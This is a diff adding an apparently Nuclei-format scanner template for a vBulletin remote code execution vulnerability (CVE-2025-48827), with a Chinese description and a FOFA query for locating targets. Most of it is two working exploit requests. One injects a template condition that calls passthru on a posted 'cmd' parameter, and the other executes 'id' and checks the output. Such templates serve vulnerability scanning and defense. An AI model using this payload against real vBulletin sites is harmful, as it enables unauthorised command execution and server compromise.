@@ -1,0 +1,43 @@
+id: vBulletin-replaceAdTemplate-RCE-CVE-2025-48827
+
+info:
+  name: "vBulletin replaceAdTemplate 控制器远程代码执行漏洞"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: app="vBulletin"
+      该漏洞源于对 PHP 反射API的不安全调用，导致攻击者可利用该漏洞绕过身份验证机制，触发受保护的控制器方法。通过向<vb:if>模板标签注入恶意条件表达式，结合passthru($_POST[<param>])函数实现PHP代码执行，并通过二次请求至/ajax/render/ad_端点完成漏洞利用，最终以Web服务器用户权限在目标系统上执行任意操作系统命令。
+  reference:
+  - https://mp.weixin.qq.com/s/EhACVdeQRtsJ2SgFZ-HYHw
+  tags: vBulletin
+
+variables:
+  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
+
+http:
+- raw:
+  - |
+    POST /ajax/api/ad/replaceAdTemplate HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    styleid=1&location={{username}}&template=<vb:if condition='"passthru"($_POST["cmd"])'></vb:if>
+  - |
+    POST /ajax/render/ad_{{username}} HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+    Content-Type: application/x-www-form-urlencoded
+
+    cmd=id
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'uid='
+    - 'gid='
+    condition: and
+  - type: status
+    status:
+    - 200
